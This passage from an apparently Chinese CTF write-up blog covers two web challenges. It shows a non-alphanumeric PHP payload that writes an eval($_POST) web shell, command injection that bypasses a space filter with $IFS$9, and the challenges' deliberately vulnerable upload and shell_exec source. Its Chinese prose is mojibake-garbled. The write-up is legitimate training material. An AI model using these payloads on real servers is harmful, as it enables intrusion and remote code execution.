important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$____</span><span class="token operator">.=</span><span class="token variable">$__</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$____</span><span class="token operator">.=</span><span class="token variable">$__</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$____</span><span class="token operator">.=</span><span class="token variable">$__</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$_</span><span class="token operator">=</span><span class="token variable">$$____</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$_</span><span class="token punctuation">[</span><span class="token constant">__</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token variable">$_</span><span class="token punctuation">[</span><span class="token constant">_</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$_</span><span class="token punctuation">[</span><span class="token constant">___</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ç„¶åå†™é©¬</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">__=file_put_contents&amp;_=3.php&amp;___=<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/06/22/2024%E9%97%BD%E7%9B%BE%E6%9D%AF-%E9%BB%91%E7%9B%BE%E8%B5%9B%E9%81%93CTF%E5%88%9D%E8%B5%9B-%E6%9C%AC%E7%A7%91%E7%BB%84/image-20240622122456075.png" alt="image-20240622122456075"></p><p>upload.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$upfile</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token variable">$upfile</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">';'</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span><span class="token variable">$upfile</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$upfile</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[^(\w|\:|\$|\.|\&lt;|\>)]/i"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$upfile</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$upfile</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'::$DATA'</span><span class="token punctuation">)</span><span class="token operator">!==</span><span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker!!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$cleanFilename</span><span class="token operator">=</span><span class="token function">get_filename</span><span class="token punctuation">(</span><span class="token variable">$upfile</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$tempfile</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$ext</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token function">get_extension</span><span class="token punctuation">(</span><span class="token variable">$upfile</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// null</span><span class="token comment">//$ext = str_ireplace('::$DATA', '', $ext);//È¥ï¿½ï¿½ï¿½Ö·ï¿½ï¿½ï¿½::$DATA</span><span class="token variable">$ext</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$ext</span><span class="token punctuation">,</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'php3'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'php5'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'php4'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'php2'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'html'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'htm'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'phtml'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'pht'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'htaccess'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'exe'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'bat'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$content</span><span class="token operator">=</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$tempfile</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[a-z0-9]/is"</span><span class="token punctuation">,</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"I don't want to see characters!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$ext</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'asp'</span> <span class="token keyword">or</span> <span class="token variable">$ext</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'asa'</span> <span class="token keyword">or</span> <span class="token variable">$ext</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'cer'</span> <span class="token keyword">or</span> <span class="token variable">$ext</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'cdx'</span> <span class="token keyword">or</span> <span class="token variable">$ext</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'aspx'</span> <span class="token keyword">or</span> <span class="token variable">$ext</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'htaccess'</span><span class="token punctuation">)</span> <span class="token variable">$ext</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'file'</span><span class="token punctuation">;</span><span class="token variable">$savefile</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'upload/'</span><span class="token operator">.</span><span class="token variable">$cleanFilename</span><span class="token operator">.</span><span class="token string double-quoted-string">"."</span><span class="token operator">.</span><span class="token variable">$ext</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$tempfile</span><span class="token punctuation">,</span><span class="token variable">$savefile</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Success upload..path :'</span><span class="token operator">.</span><span class="token variable">$savefile</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Upload failed..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">get_extension</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span> <span class="token function">strrpos</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'.'</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">get_filename</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token variable">$dotPosition</span> <span class="token operator">=</span> <span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$dotPosition</span> <span class="token operator">===</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">return</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[^\w]/'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token variable">$dotPosition</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token variable">$cleanFilename</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[^\w]/'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">return</span> <span class="token variable">$cleanFilename</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åœ¨Desktopä¸‹æ‰¾åˆ°ä¸€ä¸ªbakæ–‡ä»¶å¤¹ï¼Œdemo03ä¸‹æœ‰goæºç ï¼Œä¸‹è½½Desktopçš„bak.zipï¼Œå±…ç„¶æ˜¯gogogoçš„æºç ï¼nmæˆ‘è¿˜åœ¨æƒ³è¿™æ˜¯ä¸æ˜¯è¿™é¢˜çš„flagï¼Œæµªè´¹äº†å¾ˆä¹…</p><p>flagç¿»äº†åŠå¤©åœ¨C:&#x2F;Windows&#x2F;flag.txt</p><hr><h2 id="PDF-exportï¼ˆUnsolvedï¼‰"><a href="#PDF-exportï¼ˆUnsolvedï¼‰" class="headerlink" title="PDF exportï¼ˆUnsolvedï¼‰"></a>PDF exportï¼ˆUnsolvedï¼‰</h2><p>å¥½åƒä¸æ˜¯WeasyPrintï¼Œjavaèµ·çš„æœåŠ¡ï¼Œæ²¡å•¥å¤´ç»ªï¼Œè¾“å…¥çš„å€¼ä¼šç›´æ¥å˜æˆpdfçš„å†…å®¹</p><hr><h2 id="ä½ æ‡‚Fu22å—ï¼Ÿ"><a href="#ä½ æ‡‚Fu22å—ï¼Ÿ" class="headerlink" title="ä½ æ‡‚Fu22å—ï¼Ÿ"></a>ä½ æ‡‚Fu22å—ï¼Ÿ</h2><blockquote><p>fuzz + rce</p></blockquote><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">å­—å…¸è¶Šé•¿ä½ è¶Šå¼º<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è¿›å…¥é¢˜ç›®ï¼Œå›æ˜¾<code>Do you have only one method?</code></p><p>ç”¨postéšä¾¿ä¼ ä¸ªå‚æ•°ï¼Œå›æ˜¾<code>A pair of arguments is required, like key=value</code></p><p>é‚£å°±çˆ†ç ´å‚æ•°ï¼Œæ‰¾ä¸ªå­—å…¸çˆ†ç ´ä¸€ä¸‹ï¼š<a href="https://github.com/TheKingOfDuck/fuzzDicts/blob/master/paramDict">https://github.com/TheKingOfDuck/fuzzDicts/blob/master/paramDict</a></p><p><img src="/blog/2024/06/22/2024%E9%97%BD%E7%9B%BE%E6%9D%AF-%E9%BB%91%E7%9B%BE%E8%B5%9B%E9%81%93CTF%E5%88%9D%E8%B5%9B-%E6%9C%AC%E7%A7%91%E7%BB%84/image-20240622172937111.png" alt="image-20240622172937111"></p><p>çˆ†å‡ºä¸€ä¸ªå‚æ•° wordï¼Œå›æ˜¾<code>Congratulations on finding the correct key, continue to detect value</code></p><p>è¿˜å¾—ç»§ç»­åŠ å­—å…¸çˆ†ï¼Œçˆ†å‡ºæ¥å‚æ•°å€¼ä¸º execï¼Œå›æ˜¾<code>Congratulations on finding the right value!!!!!!!!!! Kjhsf10fds.php</code></p><p>è®¿é—® Kjhsf10fds.phpï¼Œå›æ˜¾<code>A pair of arguments is required, like key=value</code></p><p>åˆå¾—çˆ†ç ´ã€‚ã€‚çˆ†å‡ºæ¥å‚æ•°åä¸º keyï¼Œå›æ˜¾<code>What you want to do, just look for the flag!</code></p><p>æµ‹è¯•å‘ç°ä¼šå‘½ä»¤æ‰§è¡Œï¼Œè¿‡æ»¤äº†ç©ºæ ¼ï¼Œæµ‹è¯•å¯ä»¥ç”¨<code>$IFS$9</code>ç»•è¿‡</p><p>äºæ˜¯rce</p><p>payloadï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">/</span>Kjhsf10fds<span class="token operator">.</span>php<span class="token operator">?</span>key<span class="token operator">=</span><span class="token class-name type-declaration">cat</span><span class="token variable">$IFS</span><span class="token variable">$9</span><span class="token operator">/</span>www<span class="token operator">/</span>admin<span class="token operator">/</span>flag<span class="token operator">.</span>txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>flagåœ¨&#x2F;www&#x2F;admin&#x2F;flag.txtï¼š<code>flag&#123;lkjsdfnkelddfj_jkelk&#125;</code></p><p>index.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>  <span class="token variable">$imagePath</span><span class="token operator">=</span><span class="token string single-quoted-string">'jiuzhe.jpg'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;img src="'</span><span class="token operator">.</span><span class="token variable">$imagePath</span><span class="token operator">.</span><span class="token string single-quoted-string">'" alt="My Image">'</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REQUEST_METHOD'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'POST'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'word'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$cmd</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'word'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token variable">$cmd</span><span class="token operator">!=</span><span class="token string single-quoted-string">'exec'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string single-quoted-string">'Congratulations on finding the correct key, continue to detect value'</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">elseif</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token variable">$cmd</span><span class="token operator">==</span><span class="token string single-quoted-string">'exec'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Congratulations on finding the right value!!!!!!!!!!\nKjhsf10fds.php"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">echo</span> <span class="token string single-quoted-string">'A pair of arguments is required, like key=value'</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span><span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REQUEST_METHOD'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'GET'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'Do you have only one method?'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Kjhsf10fds.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token keyword">function</span> <span class="token function-definition function">executeSafeCommand</span><span class="token punctuation">(</span><span class="token variable">$command</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token comment">// å®šä¹‰ä¸€ä¸ªåŒ…å«ä¸å…è®¸çš„å­—ç¬¦çš„æ•°ç»„  </span>    <span class="token variable">$disallowedCharsPattern</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/[\\\\;|&amp;`\'&#123;&#125;>&lt;\s\r\n\t\f]/'</span><span class="token punctuation">;</span>       <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$disallowedCharsPattern</span><span class="token punctuation">,</span><span class="token variable">$command</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// æ‰§è¡Œå‘½ä»¤å¹¶è·å–è¾“å‡º  </span>    <span class="token variable">$output</span> <span class="token operator">=</span> <span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token variable">$command</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token comment">// è¿”å›å‘½ä»¤è¾“å‡ºæˆ–è¿›è¡Œå…¶ä»–å¤„ç†  </span>    <span class="token keyword">return</span> <span class="token variable">$output</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REQUEST_METHOD'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'POST'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'method not allow'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">elseif</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REQUEST_METHOD'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'GET'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>     <span class="token keyword">echo</span> <span class="token string double-quoted-string">"What you want to do, just look for the flag!\n"</span><span class="token punctuation">;</span>     <span class="token variable">$command</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>      <span class="token variable">$output</span> <span class="token operator">=</span> <span class="token function">executeSafeCommand</span><span class="token punctuation">(</span><span class="token variable">$command</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">echo</span> <span class="token variable">$output</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">echo</span> <span class="token string single-quoted-string">'A pair of arguments is required, like key=value'</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="ç­¾åˆ°é¢˜-å­¦ä¼šSM"><a href="#ç­¾åˆ°é¢˜-å­¦ä¼šSM" class="headerlink" title="ç­¾åˆ°é¢˜-å­¦ä¼šSM"></a>ç­¾åˆ°é¢˜-å­¦ä¼šSM</h2><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">æˆ‘å›½çš„å•†ç”¨å¯†ç 